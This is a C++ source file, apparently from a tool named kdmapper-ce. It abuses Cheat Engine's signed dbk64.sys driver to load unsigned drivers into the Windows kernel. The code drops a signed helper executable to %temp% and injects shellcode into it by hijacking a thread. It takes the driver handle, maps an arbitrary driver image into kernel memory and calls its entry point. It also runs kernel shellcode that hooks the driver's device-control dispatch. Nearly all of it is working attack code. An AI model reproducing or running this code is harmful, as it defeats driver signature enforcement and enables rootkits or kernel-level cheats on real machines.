#include "kdmapper_ce.hpp"

HANDLE kdmapper_ce::CreateKernelModuleUnloaderProcess() {
  
    HANDLE result = INVALID_HANDLE_VALUE;

    // drop kernelmoduleunloader.exe into the %temp% folder

    std::wstring UnloaderPath = utils::GetFullTempPath() + L"\\" + L"Kernelmoduleunloader.exe";
    utils::CreateFileToTempFromResource(L"Kernelmoduleunloader.exe", kernelmoduleunloader_resource::kernelmoduleunloader, sizeof(kernelmoduleunloader_resource::kernelmoduleunloader));

    // adjust process token

    BOOL bRet = FALSE;
    HANDLE hToken = NULL;
    LUID luid = { 0 };

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
    {
        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
        {
            TOKEN_PRIVILEGES tokenPriv = { 0 };
            tokenPriv.PrivilegeCount = 1;
            tokenPriv.Privileges[0].Luid = luid;
            tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

            bRet = AdjustTokenPrivileges(hToken, FALSE, &tokenPriv, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
        }
    }
    if (!bRet) {
        Error("RtlAdjustPrivilege failed");
        return result;
    }

    // kernelmoduleunloaderプロセスを作成

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // TODO: hide kernelmoduleunloader's popup

    if (!CreateProcess(NULL,
        (LPWSTR)UnloaderPath.c_str(),
        NULL,
        NULL,
        TRUE,          // bInheritHandles: Because shellcode requires SE_PRIVILEGE_ENABLED
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi))
    {
        Error("CreateProcess failed 0x%x", GetLastError());
        return result;
    }

    result = pi.hProcess;
    //CloseHandle(pi.hThread);
    //CloseHandle(pi.hProcess);
    return result;
}

HANDLE kdmapper_ce::GetDbk64DeviceHandleByInjection(HANDLE hTargetProcess) {

    // kernelmoduleunloader.exe process のスレッドをhijack

    HANDLE hDevice = INVALID_HANDLE_VALUE;
    HANDLE threadHijacked = NULL;
    HANDLE targetThread = NULL;
    HANDLE snapshot;
    THREADENTRY32 threadEntry;
    CONTEXT context;
    DWORD targetProcessID = GetProcessId(hTargetProcess);

    context.ContextFlags = CONTEXT_FULL;
    threadEntry.dwSize = sizeof(THREADENTRY32);

    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    Thread32First(snapshot, &threadEntry);

    while (Thread32Next(snapshot, &threadEntry))
    {
        if (threadEntry.th32OwnerProcessID == targetProcessID)
        {

#ifdef _DEBUG
            Log("kdmapper-ce.exe processID:%d TargetThreadID:%d", threadEntry.th32OwnerProcessID, threadEntry.th32ThreadID);
#endif // _DEBUG

            targetThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
            break;
        }
    }

    if (targetThread == NULL) {
        Error("OpenThread failed");
        return hDevice;
    }

    // inject shellcode

    SIZE_T shellcode_size = sizeof shellcode_resource::shellcode;

    HANDLE remoteShellcodeBuffer = VirtualAllocEx(hTargetProcess, NULL, shellcode_size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    if (remoteShellcodeBuffer == NULL) {
        Error("VirtualAllocEx failed");
        return hDevice;
    }

    WriteProcessMemory(hTargetProcess, remoteShellcodeBuffer, shellcode_resource::shellcode, shellcode_size, NULL);

    // hijack the main thread of kernelmoduleunloader

    WOW64_CONTEXT ct32;
    ZeroMemory(&ct32, sizeof(PWOW64_CONTEXT));

    Wow64SuspendThread(targetThread);
    
    ct32.ContextFlags = CONTEXT_CONTROL;
    Wow64GetThreadContext(targetThread, &ct32);
    
    ct32.Eip = (DWORD)remoteShellcodeBuffer;
    
    Wow64SetThreadContext(targetThread, &ct32);
    ResumeThread(targetThread);

    Sleep(1000); // 1s

    // patternでkernelmoduleunloaderのプロセスメモリをスキャン

    MEMORY_PATTERN  pattern = { 0x12345678, NULL, 0x12345678 };

    MEMORY_PATTERN* tmp_pattern = (MEMORY_PATTERN*)SearchMemoryForPattern(
        hTargetProcess,
        pattern,
        PAGE_READWRITE,
        MEM_COMMIT,
        MEM_PRIVATE
    );
    
#ifdef _DEBUG
    //Log("%x, %d, %x", tmp_pattern->marks, tmp_pattern->handle, tmp_pattern->marks2);
#endif // DEBUG

    if (tmp_pattern->marks == 0x12345678 && tmp_pattern->marks2 == 0x12345678) {
        hDevice = (HANDLE)tmp_pattern->handle;
    }

    return hDevice;
}

LPVOID kdmapper_ce::SearchMemoryForPattern(HANDLE hProcess, MEMORY_PATTERN pattern, DWORD flProtect, DWORD flAllocationType, DWORD flType) {

    LPVOID offset = 0;
    LPVOID lpBuffer = NULL;
    MEMORY_BASIC_INFORMATION mbi = {};
    
    lpBuffer = VirtualAlloc(NULL, sizeof(MEMORY_PATTERN), MEM_COMMIT, PAGE_READWRITE);
    if (lpBuffer == NULL) {
        Error("VirtualAlloc failed");
        return NULL;
    }

#ifdef _DEBUG
    //printf("BaseAddress");
    //printf("\tRegionSize");
    //printf("\tProtect");
    //printf("\tState");
    //printf("\tType\n");
#endif // _DEBUG

    while (VirtualQueryEx(hProcess, offset, &mbi, sizeof(mbi)))
    {

#ifdef _DEBUG
        //printf("0x%llx", mbi.BaseAddress);
        //printf("\t%llx", mbi.RegionSize);
        //printf("\t%lx", mbi.AllocationProtect);
        //printf("\t%lx", mbi.State);
        //printf("\t%lx\n", mbi.Type);
#endif // _DEBUG

        // Compare patterns

        ReadProcessMemory(hProcess, mbi.BaseAddress, lpBuffer, sizeof(MEMORY_PATTERN), NULL);
        SIZE_T res = RtlCompareMemory(lpBuffer, (const void*)&pattern, sizeof(MEMORY_PATTERN));
        
        if (mbi.AllocationProtect == flProtect && mbi.State == flAllocationType && mbi.Type == flType && res != (SIZE_T)0)
        {
            Log("Pattern found at 0x%x (match pattern count: 0x%d)", mbi.BaseAddress, res);
            break;
        }
        
        if(mbi.BaseAddress > (PVOID)0x7fffffff)
        {
            Error("Scan error: No pattern found");
            break;
        }

        offset = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);
    }

    return lpBuffer;
}


HANDLE kdmapper_ce::GetDbk64DeviceHandle()
{
	HANDLE hDbk64                              = INVALID_HANDLE_VALUE;
    HANDLE hKernelModuleUnloader     = INVALID_HANDLE_VALUE;

    hKernelModuleUnloader = CreateKernelModuleUnloaderProcess();
    if (hKernelModuleUnloader == INVALID_HANDLE_VALUE) {
        Error("CreateKernelModuleUnloaderProcess failed");
        return hDbk64;
    }

    // drop kernelmoduleunloader.exe.sig into the %temp% folder

    utils::CreateFileToTempFromResource(L"Kernelmoduleunloader.exe.sig", kernelmoduleunloader__sig_resource::kernelmoduleunloader_sig, sizeof(kernelmoduleunloader__sig_resource::kernelmoduleunloader_sig));
        
    // Inject the shellcode into the KernelModuleUnloader.exe process to get the device handle of dbk64.sys.

    HANDLE hOriginalDbk64 = GetDbk64DeviceHandleByInjection(hKernelModuleUnloader);
    if (hOriginalDbk64 == INVALID_HANDLE_VALUE || hOriginalDbk64 == NULL || hOriginalDbk64 == (HANDLE)0xffffffff) {
        Error("GetDbk64DeviceHandleByInjection failed");
        TerminateProcess(hKernelModuleUnloader, 0);
        CloseHandle(hKernelModuleUnloader);
        return hDbk64;
    }

    // Convert a handle obtained by kernelmoduleunloader into a handle that can be used by kdmapper-ce

    if (!DuplicateHandle(hKernelModuleUnloader, hOriginalDbk64, GetCurrentProcess(), &hDbk64, 0, TRUE, DUPLICATE_SAME_ACCESS)) {
        Error("DuplicateHandle failed");
        TerminateProcess(hKernelModuleUnloader, 0);
        CloseHandle(hKernelModuleUnloader);
        return hDbk64;
    }

    Log("Duplicated Dbk64.sys handle: 0x%d (original: 0x%d)", hDbk64, hOriginalDbk64);

    // Close process and process handles. 

    TerminateProcess(hKernelModuleUnloader, 0);
    CloseHandle(hKernelModuleUnloader);
	
    return hDbk64;
}


BOOL kdmapper_ce::MapDriver(HANDLE dbk64_device_handle, HANDLE hDriver, NTSTATUS* exitCode)
{
    BOOL status = FALSE;
    
    do {

        // DeviceIoControlTest
#ifdef _DEBUG
        if (!Dbk64DeviceIoControlTest(dbk64_device_handle)) {
            Error("DeviceIoControlTest failed");
            return FALSE;
        }
#endif // _DEBUG

        // .sys ファイルをパース

    const PIMAGE_NT_HEADERS64 ntHeaders = portable_executable::GetNtHeaders(hDriver);
    
    if (!ntHeaders) {
        Error("Invalid format of PE image");
        break;
    }
    
    if (ntHeaders->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        Error("[-] Image is not 64 bit");
        break;
    }

    uint32_t ImageSize = ntHeaders->OptionalHeader.SizeOfImage;

    UINT64 KernelBuf = AllocateNonPagedMem(dbk64_device_handle, ImageSize);
    if (KernelBuf == NULL) {
        Error("AllocateNoPagedMem failed");
        break;
    }

    Log("Kernel memory has been allocatted at 0x%p", KernelBuf);

    // 上で確保したバッファのMDL を作成し，ユーザー空間からアクセス可能にする

    VOID* SharedBuf = NULL;
    UINT64 Mdl = NULL;

    if (!CreateSharedMemory(dbk64_device_handle, KernelBuf, (UINT64*)&SharedBuf, &Mdl, ImageSize)) {
        Error("CreateSharedMemory failed");
        break;
    }

    Log("Shared memory has been created in user space at 0x%p (MDL: 0x%p)", SharedBuf, Mdl);

    // Copy image headers

    memcpy(SharedBuf, (BYTE*)hDriver, ntHeaders->OptionalHeader.SizeOfHeaders);

    // Copy image sections

    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (auto i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
    {
        if ((section->Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA) > 0)
            continue;
        auto sectionDestination = (LPVOID)((DWORD_PTR)SharedBuf + (DWORD_PTR)section->VirtualAddress);
        auto sectionBytes = (LPVOID)((DWORD_PTR)hDriver + (DWORD_PTR)section->PointerToRawData);
        memcpy(sectionDestination, sectionBytes, section->SizeOfRawData);
        Log("Copy section : SectionCount 0x%d 0x%p ", i, sectionDestination);
        section++;
    }

    // Resolve relocs and imports
    
    DWORD_PTR deltaImageBase = (DWORD_PTR)KernelBuf - (DWORD_PTR)ntHeaders->OptionalHeader.ImageBase;
    portable_executable::RelocateImageByDelta(portable_executable::GetRelocs((VOID*)SharedBuf), deltaImageBase);

    if (!ResolveImports(dbk64_device_handle, portable_executable::GetImports(SharedBuf))) {
        Error("Failed to resolve imports");
        break;
    }

    // unmap shared memory

    if (!UnMapSharedMemory(dbk64_device_handle, (UINT64)SharedBuf, Mdl)) {
        Error("UnMapSharedMemory failed");
        break;
    }

    // Call driver entry point

    const uint64_t address_of_entry_point = (uint64_t)KernelBuf + ntHeaders->OptionalHeader.AddressOfEntryPoint;

    Log("Calling DriverEntry 0x%p", address_of_entry_point);
    if (!kdmapper_ce::CallDriverEntry(dbk64_device_handle, address_of_entry_point)) {
        Error("Failed to call driver entry");
        break;
    }
        
    status = TRUE;

    } while (FALSE);

    return status;
}

bool kdmapper_ce::CallDriverEntry(HANDLE hDevice, UINT64 EntryPoint) {

    auto ioCtlCode = IOCTL_CE_EXECUTE_CODE;
    DWORD returned;

    struct input
    {
        UINT64	functionaddress;
        UINT64	parameters;
    }inp = { EntryPoint, NULL };

    if (DeviceIoControl(hDevice, ioCtlCode, &inp, sizeof input, nullptr, 0, &returned, nullptr))
        return TRUE;
    else
        return FALSE;

}

UINT64 kdmapper_ce::AllocateNonPagedMem(HANDLE hDevice,  SIZE_T Size) {

    auto ioCtlCode = IOCTL_CE_ALLOCATEMEM_NONPAGED;
    DWORD bytesReturned = 0;
    BOOL bRc = FALSE;

    struct input
    {
        UINT64 Size;
    } inp = { Size };

    bRc = DeviceIoControl(hDevice,
        (DWORD)ioCtlCode,
        &inp,
        sizeof(input),
        &inp,
        sizeof(input),
        &bytesReturned,
        NULL
    );

    return inp.Size;
}

BOOL kdmapper_ce::CreateSharedMemory(HANDLE hDevice, UINT64 kernelBuf, UINT64* sharedBuf, UINT64* Mdl, SIZE_T bufSize) {

    auto ioCtlCode = IOCTL_CE_MAP_MEMORY;
    DWORD bytesReturned = 0;
    BOOL bRc = FALSE;

    struct input
    {
        UINT64 FromPID;
        UINT64 ToPID;
        UINT64 address;
        DWORD size;
    } inp = { 
        GetCurrentProcessId(),
        GetCurrentProcessId(),
        kernelBuf,
        bufSize
    };

    struct output
    {
        UINT64 FromMDL;
        UINT64 Address;
    } outp = { 0 };

    bRc = DeviceIoControl(hDevice,
        (DWORD)ioCtlCode,
        &inp,
        sizeof(input),
        &outp,
        sizeof(output),
        &bytesReturned,
        NULL
    );

    *sharedBuf = outp.Address;
    *Mdl = outp.FromMDL;

    return bRc;
}

BOOL kdmapper_ce::UnMapSharedMemory(HANDLE hDevice, UINT64 sharedMemAddress, UINT64 Mdl){

    auto ioCtlCode = IOCTL_CE_UNMAP_MEMORY;
    DWORD bytesReturned = 0;
    BOOL bRc = FALSE;

    struct output
    {
        UINT64 FromMDL;
        UINT64 Address;
    } outp = {Mdl, sharedMemAddress };
    
    bRc = DeviceIoControl(hDevice,
        (DWORD)ioCtlCode,
        &outp,
        sizeof(output),
        NULL,
        0,
        &bytesReturned,
        NULL
    );

    return bRc;
}

BOOL kdmapper_ce::ExecuteKernelModeShellCode(HANDLE hDevice, UINT64 shellcodeAddress, UINT64 shellcodeParam) {

    auto ioCtlCode = IOCTL_CE_EXECUTE_CODE;
    DWORD bytesReturned = 0;
    BOOL bRc = FALSE;

    struct input
    {
        UINT64	functionaddress; //function address to call
        UINT64	parameters;
    } inp = 
    { 
        shellcodeAddress,
        shellcodeParam
    };

    bRc = DeviceIoControl(hDevice,
        (DWORD)ioCtlCode,
        &inp,
        sizeof(input),
        NULL,
        0,
        &bytesReturned,
        NULL
    );

    return bRc;
}


BOOL kdmapper_ce::Dbk64DeviceIoControlTest(HANDLE hDevice) {
    
    auto ioCtlCode = IOCTL_CE_TEST;
    DWORD bytesReturned = 0;
    BOOL bRc = FALSE;

    bRc = DeviceIoControl(hDevice,
        (DWORD)ioCtlCode,
        NULL,
        0,
        NULL,
        0,
        &bytesReturned,
        NULL
    );

    return bRc;
}

PVOID kdmapper_ce::GetSystemProcAddress(HANDLE hDevice, PCWSTR routineName) {
    auto ioCtlCode = IOCTL_CE_GETPROCADDRESS;
    DWORD bytesReturned = 0;
    BOOL bRc = FALSE;
    
    struct input
    {
        UINT64 s;
    } inp = { (UINT64)routineName };

    bRc = DeviceIoControl(hDevice,
        (DWORD)ioCtlCode,
        &inp,
        sizeof(input),
        &inp,
        sizeof(inp),
        &bytesReturned,
        NULL
    );

    return (PVOID)inp.s;
}

BOOL kdmapper_ce::PatchMajorFunction(HANDLE dbk64_device_handle)
{

    BOOL bRc = FALSE;
    SIZE_T shellcodeSize = sizeof(kernel_mode_shellcode_resource::kernel_mode_shellcode);
    VOID* shellcode = (VOID*)kernel_mode_shellcode_resource::kernel_mode_shellcode;

    do {

        // DeviceIoControlTest
#ifdef _DEBUG
        if (!Dbk64DeviceIoControlTest(dbk64_device_handle)) {
            Error("DeviceIoControlTest failed");
            return FALSE;
        }
#endif // _DEBUG


        // IRP_MJ_DEVICE_CONTROL の Hook

        // IOCTL_CE_ALLOCATEMEM_NONPAGEDで非ページプールにメモリを確保

        UINT64 kernelShellcodeBuf = AllocateNonPagedMem(dbk64_device_handle, shellcodeSize);
        if (kernelShellcodeBuf == NULL) {
            Error("AllocateNoPagedMem failed");
            break;
        }

        Log("Kernel memory has been allocatted at 0x%p", kernelShellcodeBuf);

        // 上で確保したバッファのMDL を作成し，ユーザー空間からアクセス可能にする

        UINT64 shellcodeBuf = NULL;
        UINT64 Mdl = NULL;

        if (!CreateSharedMemory(dbk64_device_handle, kernelShellcodeBuf, &shellcodeBuf, &Mdl, shellcodeSize)) {
            Error("CreateSharedMemory failed");
            break;
        }

        Log("Shared memory for shellcode has been created in user space at 0x%p (MDL: 0x%p)", shellcodeBuf, Mdl);


        // 共有メモリにカーネルモードシェルコードを書き込み

        memcpy((void*)shellcodeBuf, shellcode, shellcodeSize);

        // ユーザー空間に割り当てたメモリのアンマップ

        if (!UnMapSharedMemory(dbk64_device_handle, shellcodeBuf, Mdl)) {
            Error("UnMapSharedMemory failed");
            break;
        }

        // シェルコードの引数を準備
        // Change per PIS
        USHORT returnedDataMaxSize = sizeof(ULONG);

        LPVOID pMmGetSystemRoutineAddress = GetSystemProcAddress(dbk64_device_handle, L"MmGetSystemRoutineAddress");
        LPVOID ReturnedDataAddress = (LPVOID)AllocateNonPagedMem(dbk64_device_handle, returnedDataMaxSize);

        struct KernelPisParameters
        {
            LPVOID MmGetSystemRoutineAddress;
            LPVOID ReturnedDataAddress;
            USHORT ReturnedDataMaxSize;
        } pisParameters = {
            pMmGetSystemRoutineAddress,
            ReturnedDataAddress,
            returnedDataMaxSize
        };

        UINT64 kernelParamAddr = AllocateNonPagedMem(dbk64_device_handle, sizeof(KernelPisParameters));
        UINT64 sharedParamBuf = NULL;
        UINT64 Mdl2 = NULL;

        if (!CreateSharedMemory(dbk64_device_handle, kernelParamAddr, &sharedParamBuf, &Mdl2, sizeof(KernelPisParameters))) {
            Error("CreateSharedMemory failed");
            break;
        }

        Log("Shared memory for shellcode param has been created in user space at 0x%p (MDL: 0x%p)", sharedParamBuf, Mdl2);

        memcpy((void*)sharedParamBuf, (void*)&pisParameters, sizeof(KernelPisParameters));

        if (!UnMapSharedMemory(dbk64_device_handle, sharedParamBuf, Mdl2)) {
            Error("UnMapSharedMemory failed");
            break;
        }

        // カーネルモードシェルコードの実行

        UINT64 shellcodeAddress = kernelShellcodeBuf;
        UINT64 shellcodeParam = kernelParamAddr;
        if (!ExecuteKernelModeShellCode(dbk64_device_handle, shellcodeAddress, shellcodeParam)) {
            Error("ExecuteKernelModeShellCode failed");
            break;
        }

        bRc = TRUE;

    } while (false);

    return bRc;
}

bool kdmapper_ce::ResolveImports(HANDLE hDevice, portable_executable::vec_imports imports) {
    for (const auto& current_import : imports) {
    
        /*ULONG64 Module = utils::GetKernelModuleAddress(current_import.module_name);
        if (!Module) {
#if !defined(DISABLE_OUTPUT)
            Log("Dependency %s wasn't found", current_import.module_name);
#endif
            return false;
        }*/
        for (auto& current_function_data : current_import.function_datas) {
            //uint64_t function_address = GetKernelModuleExport(hDevice, Module, current_function_data.name);
            //TODO:
            // 現状ntoskrnlのみ対応
            std::wstring function_name(current_function_data.name.begin(), current_function_data.name.end());
            uint64_t function_address = (uint64_t)GetSystemProcAddress(hDevice, function_name.c_str());

            //uint64_t function_address = MmGetSystemRoutineAddress(hDevice, current_function_data.name);
            Log("ResolveImports: import %s (0x%p)", current_function_data.name, function_address);
//            if (!function_address) {
//                //Lets try with ntoskrnl
//                if (Module != ntoskrnlAddr) {
//                    function_address = GetKernelModuleExport(hDevice, ntoskrnlAddr, current_function_data.name);
//                    if (!function_address) {
//#if !defined(DISABLE_OUTPUT)
//                        Log("Failed to resolve import %s (%s)", current_function_data.name, current_import.module_name);
//#endif
                        //return false;
                   // }
                //}
            //}

            *current_function_data.address = function_address;
        }
    }

    return true;
}